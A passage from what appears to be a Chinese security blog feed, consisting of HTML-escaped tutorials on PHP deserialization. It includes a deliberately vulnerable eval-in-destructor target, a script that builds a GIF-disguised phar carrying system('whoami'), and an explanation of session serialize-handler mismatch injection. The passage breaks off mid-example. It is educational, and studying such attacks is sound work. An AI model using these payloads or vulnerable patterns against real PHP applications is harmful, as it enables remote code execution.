      &lt;span class=&#34;s2&#34;&gt;&amp;#34;upload_file/&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Stored in: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;upload_file/&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Invalid file,you can only upload gif&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;    
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;evil.php:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// file_exists函数会触发phar反序列化
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;echo &amp;#34;Hello World&amp;#34;;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]){&lt;/span&gt;
	&lt;span class=&#34;nx&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;利用：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Test&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Phar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;img.phar&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;startBuffering&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;setStub&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;GIF89a&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php __HALT_COMPILER();?&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;//设置stub，增加gif文件头
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addFromString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;testHAHA&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;//添加要压缩的文件
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$object&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$object&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;system(&amp;#39;whoami&amp;#39;)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;setMetadata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;//将自定义meta-data存入manifest
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;stopBuffering&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 702; 
			flex-basis: 1686px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-2/image-20220221153148617.png&#34; data-size=&#34;822x117&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-2/image-20220221153148617.png&#34;
			width=&#34;822&#34;
			height=&#34;117&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-2/image-20220221153148617_huaf627b24fa586f42be834f7f2422878b_13300_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-2/image-20220221153148617_huaf627b24fa586f42be834f7f2422878b_13300_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PHP 反序列化-3</title>
        <link>https://coollllllll.github.io/p/php-3/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/php-3/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/php-3/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post PHP 反序列化-3" /&gt;&lt;h1 id=&#34;php反序列化-3&#34;&gt;PHP反序列化-3&lt;/h1&gt;
&lt;h2 id=&#34;php中的session&#34;&gt;PHP中的Session&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;Directive&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;session.save_handler&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;session保存形式。默认为files&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;session.save_path&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;session保存路径。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;session.serialize_handler&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;session序列化存储所用处理器。默认为php&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;session.upload_progress.cleanup&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;一旦读取了所有POST数据，立即清除进度信息。默认开启&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;session.upload_progress.enabled&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;将上传文件的进度信息存在session中。默认开启。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;在上述的配置中，&lt;code&gt;session.serialize_handler&lt;/code&gt;是用来设置session的序列化引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不同。具体如下：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:left&#34;&gt;处理器名称&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;存储格式&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;php&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;键名 + 竖线 + 经过&lt;code&gt;serialize()&lt;/code&gt;函数序列化处理的值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;php_binary&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;键名的长度对应的 ASCII 字符 + 键名 + 经过&lt;code&gt;serialize()&lt;/code&gt;函数序列化处理的值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;php_serialize&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;经过serialize()函数序列化处理的&lt;strong&gt;数组&lt;/strong&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;ini_set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;session.serialize_handler&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;引擎名&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;session_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;haha&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;php引擎：&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 534; 
			flex-basis: 1283px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-3/image-20220221154530020.png&#34; data-size=&#34;139x26&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-3/image-20220221154530020.png&#34;
			width=&#34;139&#34;
			height=&#34;26&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-3/image-20220221154530020_hucaf212580a72fcf1818e0ec7ef14c900_1736_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-3/image-20220221154530020_hucaf212580a72fcf1818e0ec7ef14c900_1736_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;php_binary:&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 714; 
			flex-basis: 1714px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-3/image-20220221154656400.png&#34; data-size=&#34;150x21&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-3/image-20220221154656400.png&#34;
			width=&#34;150&#34;
			height=&#34;21&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-3/image-20220221154656400_hu7d25136b513882a7759e344d75d571f4_1996_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-3/image-20220221154656400_hu7d25136b513882a7759e344d75d571f4_1996_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;php_serialize:&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1100; 
			flex-basis: 2640px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-3/image-20220221154741266.png&#34; data-size=&#34;231x21&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-3/image-20220221154741266.png&#34;
			width=&#34;231&#34;
			height=&#34;21&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-3/image-20220221154741266_hu60e07f9d08ffeb172667bc69f16e7dfa_2520_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-3/image-20220221154741266_hu60e07f9d08ffeb172667bc69f16e7dfa_2520_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;session反序列化漏洞原理&#34;&gt;Session反序列化漏洞原理&lt;/h2&gt;
&lt;p&gt;如果在PHP在反序列化存储的$_SESSION数据时&lt;strong&gt;使用的引擎和序列化使用的引擎不一样&lt;/strong&gt;，会导致数据无法正确反序列化。通过精心构造数据包，就可以绕过程序的验证或者是执行一些敏感操作。&lt;/p&gt;
&lt;p&gt;例如-在session中放入如下数据：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$_SESSION[&#39;name&#39;] = &#39;|O:8:&amp;quot;stdClass&amp;quot;:0:{}&#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而存储session数据用的处理器为&lt;code&gt;php_serialize&lt;/code&gt;，内容如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;a:1:{s:4:&amp;quot;name&amp;quot;;s:20:&amp;quot;|O:8:&amp;quot;stdClass&amp;quot;:0:{}&amp;quot;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么当读取数据时采用的是&lt;code&gt;php&lt;/code&gt;引擎的话，反序列化时，根据php引擎对session数据的解释，会将&lt;code&gt;|&lt;/code&gt;以前看作键名，而将这之后的&lt;code&gt;O:8:&amp;quot;stdClass&amp;quot;:0:{}&lt;/code&gt;看作键值，反序列后就会得到stdClass类对象。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;分两种情况进行利用：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;session.auto_start=On&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当配置选项 session.auto_start＝On，会自动注册 Session 会话（相当于执行了&lt;code&gt;session_start()&lt;/code&gt;），因为该过程是发生在&lt;strong&gt;脚本代码执行前&lt;/strong&gt;，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的。因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话。然后设置需要的序列化处理器，再调用 session_start() 函数注册会话，这时如果脚本中设置的序列化处理器与 php.ini 中设置的不同，就会出现安全问题。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ini_get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;session.auto_start&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; 
  &lt;span class=&#34;nx&#34;&gt;session_destroy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;

&lt;span class=&#34;nx&#34;&gt;ini_set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;session.serialize_handler&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;php_serialize&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;session_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;
  &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;session.auto_start=Off&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题。&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例&lt;/h2&gt;
&lt;p&gt;index.php:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;//A webshell is wait for you
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ini_set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;session.serialize_handler&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;session_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;OowoO&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$mdzz&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;mdzz&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;phpinfo();&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    
    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;mdzz&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;phpinfo&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$m&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;OowoO&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;highlight_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;index.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;传入phpinfo，看一看配置：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 334; 
			flex-basis: 802px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-3/image-20220221165058052.png&#34; data-size=&#34;930x278&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-3/image-20220221165058052.png&#34;
			width=&#34;930&#34;
			height=&#34;278&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-3/image-20220221165058052_hua006efd23c27f608cb73fbb936663f93_22459_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-3/image-20220221165058052_hua006efd23c27f608cb73fbb936663f93_22459_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可看到&lt;strong&gt;Session序列化和反序列化的处理引擎不同&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;而想要进行利用就得往session中放入数据，可利用&lt;code&gt;session.upload_progress&lt;/code&gt;，可观察到&lt;strong&gt;session.upload_progress.cleanup&lt;code&gt;配置为&lt;/code&gt;Off&lt;/strong&gt;:&lt;/p&gt;
